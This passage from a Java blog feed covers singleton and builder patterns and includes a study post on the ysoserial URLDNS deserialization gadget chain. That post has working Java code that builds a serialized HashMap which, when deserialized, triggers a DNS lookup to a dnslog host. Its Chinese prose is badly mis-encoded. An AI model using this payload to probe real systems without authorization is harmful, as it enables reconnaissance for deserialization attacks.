&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ç§æ–¹æ³•æœ‰ç§ç¼ºé™·ï¼Œç”±äºæ‡’æ±‰å¼åœ¨æ–¹æ³•ä¸­è¿›è¡Œåˆå§‹åŒ–ï¼Œåœ¨å¤šçº¿ç¨‹çš„ç¯å¢ƒä¸‹ï¼Œå¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚</p><h3 id="æ‡’æ±‰å¼-æ”¹è¿›"><a href="#æ‡’æ±‰å¼-æ”¹è¿›" class="headerlink" title="æ‡’æ±‰å¼-æ”¹è¿›"></a>æ‡’æ±‰å¼-æ”¹è¿›</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ç§æ•ˆç‡æ¯”è¾ƒä½ï¼Œåªèƒ½åˆä¸€ä¸ªçº¿ç¨‹èƒ½è¿›å…¥åŒæ­¥å—ï¼Œå…¶ä»–çš„å¿…é¡»è¦ç­‰å¾…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">//åŒé‡æ£€æŸ¥</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒé‡æ£€æŸ¥å¯ä»¥ç¡®ä¿åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¹Ÿèƒ½ä¿æŒå•ä¾‹çš„å”¯ä¸€æ€§ï¼ŒåŒæ—¶å°½å¯èƒ½åœ°å‡å°‘äº†åŒæ­¥çš„å¼€é”€ã€‚</p><h3 id="JAVAç‰¹æœ‰çš„å†™æ³•"><a href="#JAVAç‰¹æœ‰çš„å†™æ³•" class="headerlink" title="JAVAç‰¹æœ‰çš„å†™æ³•"></a>JAVAç‰¹æœ‰çš„å†™æ³•</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonHolder</span> &#123;  <span class="hljs-comment">//ç”±é™æ€å†…éƒ¨ç±»æŒæœ‰å•ä¾‹å¯¹è±¡ï¼Œæ ¹æ®ç±»åŠ è½½çš„ç‰¹æ€§ï¼Œä»…ä½¿ç”¨Singletonç±»æ—¶ï¼Œä¸ä¼šå¯¹é™æ€å†…éƒ¨ç±»è¿›è¡Œåˆå§‹åŒ–</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123; <span class="hljs-comment">//åªæœ‰çœŸæ­£ä½¿ç”¨å†…éƒ¨ç±»æ—¶ï¼Œæ‰ä¼šè¿›è¡Œç±»åˆå§‹åŒ–</span><br>        <span class="hljs-keyword">return</span> SingletonHolder.INSTANCE;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨Javaä¸­ï¼Œé™æ€å†…éƒ¨ç±»åœ¨è¢«ä½¿ç”¨ä¹‹å‰æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œè¿™æ˜¯ç”±ç±»åŠ è½½å™¨çš„å·¥ä½œåŸç†å†³å®šçš„ã€‚</p><p>å½“ç¨‹åºç¬¬ä¸€æ¬¡è®¿é—®é™æ€å†…éƒ¨ç±» <code>SingletonHolder</code> æ—¶ï¼ŒJVM ä¼šåŠ è½½ <code>SingletonHolder</code> ç±»ã€‚è¿™ä¸ªåŠ è½½è¿‡ç¨‹æ˜¯å»¶è¿Ÿçš„ï¼Œåªæœ‰åœ¨çœŸæ­£éœ€è¦ä½¿ç”¨ <code>SingletonHolder</code> ç±»æ—¶æ‰ä¼šè§¦å‘ã€‚æ‰€ä»¥ï¼Œå³ä½¿ <code>Singleton</code> ç±»è¢«åŠ è½½äº†ï¼Œä½†æ˜¯ä¸ä¼šå¯¼è‡´ <code>SingletonHolder</code> ç±»è¢«åŠ è½½ï¼Œä¹Ÿå°±ä¸ä¼šåˆ›å»ºå•ä¾‹å¯¹è±¡ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAè®¾è®¡æ¨¡å¼</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RULDNSé“¾</title>
    <link href="/2024/05/09/JAVA%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/"/>
    <url>/2024/05/09/JAVA%E5%AE%89%E5%85%A8/URLDNS%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="URLDNSé“¾ä¼˜ç‚¹"><a href="#URLDNSé“¾ä¼˜ç‚¹" class="headerlink" title="URLDNSé“¾ä¼˜ç‚¹"></a>URLDNSé“¾ä¼˜ç‚¹</h2><ol><li>ä½¿â½¤Javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰â½…åº“æ²¡æœ‰ä¾èµ–</li><li>åœ¨â½¬æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</li></ol><h2 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h2><p>ysoserial ä¸­URLDNSé“¾ ï¼Œ çœ‹è¿™ä¸ªåˆ©ç”¨é“¾åªæ¶‰åŠä¸¤ä¸ªç±»<strong>HashMap</strong>å’Œ<strong>URL</strong>ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509090622554.png" alt="image-20240509090622554"></p><h3 id="HashMapç±»"><a href="#HashMapç±»" class="headerlink" title="HashMapç±»"></a>HashMapç±»</h3><p><strong>HashMap</strong>è‡ªå·±å®ç°äº†<code>readObject()</code>ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093642516.png" alt="image-20240509093642516"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br></code></pre></td></tr></table></figure><p>putValé‡æ–°è®¡ç®—äº†keyçš„hashï¼Œè·Ÿè¿›<code>hash()</code>ï¼ˆCtrl+é¼ æ ‡å·¦é”®ï¼‰</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509093734192.png" alt="image-20240509093734192"></p><p>ä»£ç æ„æ€æ˜¯å¦‚æœkeyä¸ºnullè¿”å›0ï¼Œå¦‚æœä¸ä¸ºnullï¼Œåˆ™è°ƒç”¨keyçš„<code>hashCode()</code>ã€‚</p><p>é‚£æˆ‘ä»¬æ€è€ƒï¼Œå‡å¦‚æœ‰ä¸ªaç±»æœ‰<code>hashCode()</code>æ–¹æ³•ï¼ŒæŠŠaç±»ä½œä¸ºhashMapçš„keyï¼Œåœ¨è¿™é‡Œå°±ç›¸å½“äºè°ƒç”¨aç±»çš„<code>hashCode()</code>ï¼Œè¿™å°±æ˜¯åŒåå‡½æ•°è°ƒç”¨ã€‚</p><h3 id="URLç±»"><a href="#URLç±»" class="headerlink" title="URLç±»"></a>URLç±»</h3><p>æ‰¿æ¥ä¸Šæ–‡ï¼Œ<strong>URL</strong>ç±»ä¸­æœ‰<code>hashCode()</code>æ–¹æ³•,<code>hashCode()</code>è¢«handlerè°ƒç”¨ï¼Œhandler åˆæ˜¯ <strong>URLStreamHandler</strong> çš„æŠ½è±¡ç±»ï¼Œæˆ‘ä»¬å†å»æ‰¾ <strong>URLStreamHandler</strong> çš„ <code>hashCode()</code> æ–¹æ³•ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509102412486.png" alt="image-20240509102412486"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>hashCode()</code>æ–¹æ³•ä¼ å…¥ä¸€ä¸ªurlï¼Œ<code>getHostAddress(url)</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103443938.png" alt="image-20240509103443938"></p><p>è¿›å…¥<code>getHostAddress()</code>æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103838469.png" alt="image-20240509103838469"></p><p>è¿™æ®µä»£ç æ„æ€æ˜¯è·å–ç»™å®š URL å¯¹è±¡çš„ä¸»æœºåœ°å€ã€‚å¦‚æœä¸»æœºåœ°å€å·²ç»ç¼“å­˜è¿‡ï¼Œåˆ™ç›´æ¥è¿”å›ç¼“å­˜çš„åœ°å€ï¼›å¦åˆ™ï¼Œå°è¯•è§£æä¸»æœºåè·å–ä¸»æœºåœ°å€ï¼Œå¹¶ç¼“å­˜ç»“æœã€‚åœ¨â½¹ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNS æŸ¥è¯¢ã€‚</p><p><strong>æµç¨‹</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// é¦–å…ˆé€šè¿‡HashMapçš„readObjectå‡½æ•°,ä¼šè°ƒç”¨putVal()å‡½æ•°è®¡ç®—hasHmapçš„key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)ä¼šå¯¹keyè°ƒç”¨hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// å¦‚æœä¼ å…¥çš„key æ˜¯ä¸€ä¸ªURLå¯¹è±¡</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// ç„¶åä¼šè§¦å‘URLå¯¹è±¡hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// å¦‚æœhashcodeä¸ä¸º-1,å°±ä¼šè°ƒç”¨handlerçš„hashcode,å¹¶ä¸”ä¼ å…¥url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// åœ¨handlerçš„hashcodeé‡Œé¢ä¼šè°ƒç”¨getHostAddress,å‚æ•°æ˜¯url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// æœ€åå‘èµ·ä¸€æ¬¡dnsè¯·æ±‚</span><br><span class="hljs-number">7</span>. dnsè¯·æ±‚<br></code></pre></td></tr></table></figure><hr><h2 id="URLDNSé“¾"><a href="#URLDNSé“¾" class="headerlink" title="URLDNSé“¾"></a>URLDNSé“¾</h2><p>å‚è€ƒä¸Šé¢çš„æµç¨‹ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªhashMapï¼Œåœ¨hashMapçš„keyä¼ å…¥urlå¯¹è±¡ï¼Œçœ‹<strong>URL</strong>çš„æ„é€ æ–¹æ³•ï¼Œæœ€ç®€å•çš„æ„é€ æ–¹æ³•ç›´æ¥æ”¾å…¥ä¸€ä¸ªurlåœ°å€å°±å¯ä»¥</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145326944.png" alt="image-20240509145326944"></p><p>hashMapä¸ç›´æ¥ç›´æ¥ä¼ å‚ï¼Œå¿…é¡»ç”¨<code>put()</code>æ–¹æ³•ï¼Œputè¿›å»ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145753562.png" alt="image-20240509145753562"></p><p>å¦‚æœä¸€åˆ‡é¡ºåˆ©çš„è¯</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// é¦–å…ˆé€šè¿‡HashMapçš„readObjectå‡½æ•°,ä¼šè°ƒç”¨putVal()å‡½æ•°è®¡ç®—hasHmapçš„key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)ä¼šå¯¹keyè°ƒç”¨hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// å¦‚æœä¼ å…¥çš„key æ˜¯ä¸€ä¸ªURLå¯¹è±¡</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// ç„¶åä¼šè§¦å‘URLå¯¹è±¡hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// å¦‚æœhashcodeä¸ä¸º-1,å°±ä¼šè°ƒç”¨handlerçš„hashcode,å¹¶ä¸”ä¼ å…¥url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// åœ¨handlerçš„hashcodeé‡Œé¢ä¼šè°ƒç”¨getHostAddress,å‚æ•°æ˜¯url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// æœ€åå‘èµ·ä¸€æ¬¡dnsè¯·æ±‚</span><br><span class="hljs-number">7</span>. dnsè¯·æ±‚<br></code></pre></td></tr></table></figure><h3 id="åˆé‡éš¾é¢˜"><a href="#åˆé‡éš¾é¢˜" class="headerlink" title="åˆé‡éš¾é¢˜"></a>åˆé‡éš¾é¢˜</h3><p>ä½†æ˜¯æˆ‘ä»¬å‘ç°åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±å·²ç»è§¦å‘äº†</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509150138622.png" alt="image-20240509150138622"></p><p>è·Ÿè¿›<strong>hashMap</strong>çš„<code>put()</code>æ–¹æ³•ï¼Œå‘ç°åœ¨putçš„æ—¶å€™å°±å·²ç»å¯¹keyè¿›è¡Œä¸€æ¬¡<code>hash()</code>äº†ï¼Œè§¦å‘äº†<strong>URL</strong>ç±»çš„<code>hashCode()</code>æ–¹æ³•</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509111302937.png" alt="image-20240509111302937"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152432465.png" alt="image-20240509152432465"></p><p>æˆ‘ä»¬å‘ç°ï¼Œå½“ <code>hashCode</code> çš„å€¼ä¸ç­‰äº -1 çš„æ—¶å€™ï¼Œå‡½æ•°å°±ä¼šç›´æ¥ <code>return hashCode</code> è€Œä¸æ‰§è¡Œ <code>hashCode = handler.hashCode(this);</code>ã€‚è€Œä¸€å¼€å§‹å®šä¹‰ HashMap ç±»çš„æ—¶å€™<code>hashCode</code> çš„å€¼ä¸º -1ï¼Œä¾¿æ˜¯å‘èµ·äº†è¯·æ±‚ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152449960.png" alt="image-20240509152449960"></p><h3 id="è§£å†³é—®é¢˜"><a href="#è§£å†³é—®é¢˜" class="headerlink" title="è§£å†³é—®é¢˜"></a>è§£å†³é—®é¢˜</h3><p>æ€è·¯ï¼šåœ¨putå‰ï¼Œä½¿hashCodeä¸ç­‰äº-1ï¼ŒputåhashCodeç­‰äº-1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <br>         <span class="hljs-comment">//æ€è·¯</span><br>        <span class="hljs-comment">//HashMap&lt;URL, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br>        <span class="hljs-comment">//å°†hashCOdeå€¼æ”¹ä¸ºä¸æ˜¯-1ï¼Œput()çš„æ—¶å€™å°±ä¸ä¼šå‘èµ·è¯·æ±‚</span><br>        <span class="hljs-comment">//URL url = new URL(&quot;http://jhc0ym.dnslog.cn&quot;);</span><br>       <br>        <span class="hljs-comment">//hashMap.put(url, 1);</span><br>        <span class="hljs-comment">//å°†hashCodeå€¼æ”¹ä¸º-1</span><br>        <br>        <span class="hljs-comment">//Serialization(hashMap);</span><br>        <br>        <span class="hljs-comment">//å®ç°</span><br>        HashMap&lt;URL, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <span class="hljs-comment">//æ–°å»ºä¸€ä¸ªhashMap</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://jhc0ym.dnslog.cn&quot;</span>);  <span class="hljs-comment">//url</span><br>        <br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URL</span>&gt; c = url.getClass();  <span class="hljs-comment">//è·å–ä¸€ä¸ªClass</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <span class="hljs-comment">//è·å–hashCodeå­—æ®µ</span><br>        hashCodefile.setAccessible(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//è®¾ç½®å­—æ®µè®¿é—®æƒé™</span><br>        hashCodefile.set(url, <span class="hljs-number">123</span>); <span class="hljs-comment">//å°†hashCodeæ”¹ä¸º123</span><br><br><br>        hashMap.put(url, <span class="hljs-number">1</span>);<br>        hashCodefile.set(url, -<span class="hljs-number">1</span>);  <span class="hljs-comment">//putå®Œåæ”¹ä¸º-1</span><br><span class="hljs-comment">//        Serialization(hashMap);</span><br>        Deserialization(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialization</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123; <span class="hljs-comment">//åºåˆ—åŒ–</span><br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        outputStream.writeObject(obj);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Deserialization</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <span class="hljs-comment">//ååºåˆ—åŒ–</span><br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        inputStream.readObject();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://juejin.cn/post/6844903954774491144#heading-5">ä¸ºä»€ä¹ˆhashMapè¦å®ç°è‡ªå·±çš„writeObjectå’ŒreadObjectæ–¹æ³•</a></p><p><a href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%AE%9E%E6%88%98-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-URLDNS">Javaååºåˆ—åŒ–åŸºç¡€ç¯‡-01-ååºåˆ—åŒ–æ¦‚å¿µä¸åˆ©ç”¨</a></p><p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–æ¼æ´ä¸“é¢˜-åŸºç¡€ç¯‡(21&#x2F;09&#x2F;05æ›´æ–°ç±»åŠ è½½éƒ¨åˆ†)</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆ›å»ºå‹-å»ºé€ è€…æ¨¡å¼</title>
    <link href="/2024/05/08/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/"/>
    <url>/2024/05/08/JAVA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-type">int</span> age;<br>    String name;<br>    String gender; <br>    String profession;<br>    List&lt;String&gt; awards;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">int</span> age, String name, String gender, String profession, List&lt;String&gt; awards)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender = gender; <br>        <span class="hljs-built_in">this</span>.profession = profession;<br>        <span class="hljs-built_in">this</span>.awards = awards;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å­¦ç”Ÿç±»çš„å±æ€§éå¸¸å¤šï¼Œå¯¼è‡´æ„é€ å‡½æ•°ï¼Œä¹Ÿéå¸¸å¤šï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡newçš„æ–¹å¼åˆ›å»ºå¾ˆå®¹æ˜“å¡«é”™å‚æ•°ä½ç½®ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 